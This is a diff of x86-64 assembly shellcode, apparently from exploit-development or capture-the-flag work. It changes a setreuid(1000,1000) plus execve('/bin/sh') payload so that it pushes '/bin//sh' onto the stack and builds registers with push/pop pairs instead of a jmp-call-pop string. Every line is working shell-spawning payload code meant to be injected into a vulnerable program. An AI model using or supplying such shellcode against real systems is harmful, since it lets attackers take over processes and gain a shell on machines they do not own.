@@ -6,27 +6,27 @@ _start:
 	
 	; setreuid(1000, 1000)
 
-	xor rax, rax
-	mov al, 0x71
-	mov rdi, rax
+	push 0x71
+	pop rax ;  SYS_setreuid
+
+	push rax
+	pop rdi
 	mov di, 1000
-	mov rsi, rdi
+	push rdi
+	pop rsi
 
 	syscall 
 
-	jmp binsh
-
-	exec:
-	
 	; execve("/bin/sh", NULL, NULL)
-	
-	mov rsi, rax
-	mov rdx, rax
-	mov al, 0x3b
-	pop rdi
+	xor rsi, rsi
+	push rsi
+	pop rdx
 
+	push rdx
+	mov rdi, 0x68732f2f6e69622f ; /bin//sh
+	push rdi
+	mov rdi, rsp
+
+	push 0x3b
+	pop rax ; SYS_execve
 	syscall
-
-	binsh:
-		call exec
-		db "/bin/sh"
